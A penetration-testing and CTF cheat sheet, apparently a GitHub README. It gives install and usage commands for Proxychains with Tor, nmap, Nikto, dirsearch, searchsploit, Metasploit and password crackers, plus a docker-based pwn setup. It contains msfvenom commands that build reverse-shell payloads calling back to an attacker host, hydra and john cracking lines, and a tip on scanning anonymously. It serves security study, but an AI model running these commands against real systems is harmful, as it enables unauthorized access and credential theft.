# HackingCheatSheet
### outline
* Hacking Tools
	* [Proxychains](#Proxychains)
	* [Nmap](#Nmap)
	* [Nicto](#Nicto)
	* [Dirsearch](#Dirsearch)
	* [Exploitdb](#Exploitdb)	
	* [Metasploit](#Metasploit)
	* [Brute force password tools](#Password-crack)
* CTF Pwn Cheatsheet
	* [Build pwn environment with docker](#Environment)
	* [Others](#Others)
* Privilege Escalation
* Reverse Shell
## Hacking Tools
### Proxychains 
Proxychains is a tool that could let us anonymous on the internet.
* Install On Ubuntu
```
1. git clone https://github.com/rofl0r/proxychains
2. cd proxychains
3. ./configure
4. make & make install  
```
* Install On MacOS
```
1. brew install proxychains-ng 
2. close SIP
   Reboot computer and prsee "Command + R" into recovery mode.
   Press Utilities -> Terminal (At upper left).
   Enter "csrutil disable".
   Reboot.
```
* Install Tor
```
Linux : sudo apt-get install tor
MacOS : download from "https://www.torproject.org/download/"
```
* Setting Config File  
File Path :  
 	Linux : /etc/proxychains.conf  
	MacOS : /usr/local/etc/proxychains.conf
```
# proxychains.conf  VER 4.x
#
#        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.


# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
#strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#round_robin_chain
#
# Round Robin - Each connection will be done via chained proxies
# of chain_len length
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped).
# the start of the current proxy chain is the proxy after the last
# proxy in the previously invoked proxy chain.
# if the end of the proxy chain is reached while looking for proxies
# start at the beginning again.
# otherwise EINTR is returned to the app
# These semantics are not guaranteed in a multithreaded environment.
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain or round_robin_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# set the class A subnet number to use for the internal remote DNS mapping
# we use the reserved 224.x.x.x range by default,
# if the proxified app does a DNS request, we will return an IP from that range.
# on further accesses to this ip we will send the saved DNS name to the proxy.
# in case some control-freak app checks the returned ip, and denies to 
# connect, you can use another subnet, e.g. 10.x.x.x or 127.x.x.x.
# of course you should make sure that the proxified app does not need
# *real* access to this subnet. 
# i.e. dont use the same subnet then in the localnet section
#remote_dns_subnet 127 
#remote_dns_subnet 10
remote_dns_subnet 224

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 80000

### Examples for localnet exclusion
## localnet ranges will *not* use a proxy to connect.
## Exclude connections to 192.168.1.0/24 with port 80
# localnet 192.168.1.0:80/255.255.255.0

## Exclude connections to 192.168.100.0/24
# localnet 192.168.100.0/255.255.255.0

## Exclude connections to ANYwhere with port 80
# localnet 0.0.0.0:80/0.0.0.0

## RFC5735 Loopback address range
## if you enable this, you have to make sure remote_dns_subnet is not 127
## you'll need to enable it if you want to use an application that 
## connects to localhost.
#localnet 127.0.0.0/255.0.0.0

## RFC1918 Private Address Ranges
# localnet 10.0.0.0/255.0.0.0
# localnet 172.16.0.0/255.240.0.0
# localnet 192.168.0.0/255.255.0.0

# ProxyList format
#       type  ip  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#       only numeric ipv4 addresses are valid
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080	
#		
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks5 	127.0.0.1 9150
```
* Usage
```
proxychains4 nmap www.example.com # Anonymous scanning the web server with nmap 
(When using MacOS remembering to open tor browser before using proxychains)
```
### Nmap
Scanning specific ports
```
nmap -p 80-200
```
Scanning opened port and service version
```
nmap "IP" --top-ports 1000 --open -sV
```
Scanning opened port and OS information 
```
nmap -O "IP"
```
Detect hosts that are powered on in this domain
```
nmap -sP "xxx.xxx.xxx.0/24"
```
### Nicto
This is a tool for scanning the web service version and the existing vulnerabilities.
* Usage 
```
nicto -h "Target IP" -p "Target Port"
```
### Dirsearch
It is a tool that could brute force directories and files in websites.
* Install & Usage
```
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u "Web URL" -e *
```
### Exploitdb
This is an exploit database
* Usage
```
searchsploit linux 4 priv  # Searching existing exploit about "linux kernel 4.x privilege escalation"
```
### Metasploit
This is just an useful penetration test tool.
* Usage
```
search Apache 	# Searching the vulnerability about "Apache"
use XXXXXX    	# Using the exp
show options  	# Show the exp options
set XXX 		# Setting the options
exploit			# run the exp
```
* Meterpreter
This is a subservice in metasploit. It could help us create the malicious scripts.
```
msfvenom -p windows/meterpreter/reverse_tcp lhost="Your IP" lport="Your Port" -f reverseshell.exe
(Create a windows execute file for reversing shell)

msfvenom -p python/meterpreter/reverse_tcp LHOST="Your IP" LPORT="Your Port" -f pyterpreter.py
(Create a pyhton reverse shell script)
```
### Password-crack
/etc/shadow and /etc/passwd are the sensitive file in linux.
* john
```
john encrypted.txt --wordlist=rockyou.txt (this is a password dictionary file)
```
* hydra
It is a tool that could crack online password.
```
hydra -l "Target User Name" -P rockyou.txt "IP"
```

## CTF Pwn Cheatsheet
### Environment
* Pull ubuntu environment from dockerhub
```
docker pull ubuntu:19.04 # Selet linux version you want
docker run -i -t --name create_env ubuntu:19.04 bash
```
* Setuo docker image environment 
```
apt-get update
apt-get install vim 
apt-get install gdb
apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
pip install pwntools
```
* Install peda & pwngdb
```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
```
* Install ROPgadget & one_gadget
```
pip install ropgadget 
apt-get install ruby
apt-get install gem
gem install one_gadget
```
* Install tmux
```
apt-get install tmux 
touch .tmux.conf 
echo "set -g mouse on" > .tmux.conf
```
* Create docker image & pwn container 
```
docker commit "Container ID" "Image Name"
docker run -it --privileged --name "Container Name" -v "Shared Folder Path" "Your Docker Image"
```
### Others
* Close ASLR
```
Close :
echo 0 > /proc/sys/kernel/randomize_va_space

Open ASLR(Partial Random)：
echo 1 > /proc/sys/kernel/randomize_va_space

Open ASLR(Full Random)：
echo 2 > /proc/sys/kernel/randomize_va_space
```
* A good docker image for pwn(pwndocker)  
pwndocker : https://github.com/skysider/pwndocker.git  
How to change glibc in pwndocker ?
```
cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so
patchelf --set-interpreter /tmp/ld-2.27.so ./test
LD_PRELOAD=./libc.so.6 ./test

or

p = process(["/path/to/ld.so", "./test"], env={"LD_PRELOAD":"/path/to/libc.so.6"})
```
